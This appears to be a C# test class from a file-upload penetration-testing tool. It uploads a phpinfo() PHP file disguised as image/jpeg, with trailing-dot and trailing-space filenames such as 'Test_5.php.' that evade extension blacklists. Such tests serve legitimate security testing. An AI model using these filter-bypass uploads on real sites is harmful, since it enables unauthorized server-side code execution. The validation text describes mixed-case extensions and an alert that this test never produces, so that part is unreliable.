using System.Text;
using System.Threading.Tasks;

/*
* Test #5
* Description: This test inserts a mixture of spaces and dots after the filename to avoid filters.
* The server will generally trim the extra spaces and dots.
*/
namespace Upsploit.Tests {
    class Test05 : Test {
        public override sealed string description { get; set; }
        public override sealed string validation { get; set; }

        public Test05() {
            description = "This test uploads several files with the MIME type \"image/jpeg\". The files are \"Test_5.php \", \"Test_5.php.\" and \"Test_5.php… … . . .. .. \"." +
                          "The server will typically trim extra spaces and/or periods off a filename." +
                          "\r\n\r\n" +
                          "The test will work on websites that are blacklisting extensions in a case-insensitive way.";

            validation = "Look for \"Test_5.hTMl\", \"Test_5.aSp\" or \"Test_5.pHp\" on the web application. " +
                         "If the file loads any of these pages and displays an alert, the test was a success and the web application is vulnerable.\r\n\r\n" +
                         "If the webpage no longer has the correct extension or it doesn't render in the browser, the test failed.";
        }

        internal override async Task runTest(UploadRequest.UploadRequest request) {
            const string data = "<?php\n"
                              + "  echo phpinfo();\n"
                              + "?>";

            request.setFileData(Encoding.ASCII.GetBytes(data));
            request.setFileContentType("image/jpeg");

            //Dot test
            request.setFileName("Test_5.php.");
            await request.send();
            printResult(request, "Test 05 (dot test)");

            //Space test
            request.setFileName("Test_5.php ");
            await request.send();
            printResult(request, "Test 05 (space test)");

            //Mixed test
            request.setFileName("Test_5.php… … . . .. .. ");
            await request.send();
            printResult(request, "Test 05 (mixed dot/space test)");
        }
    }
}
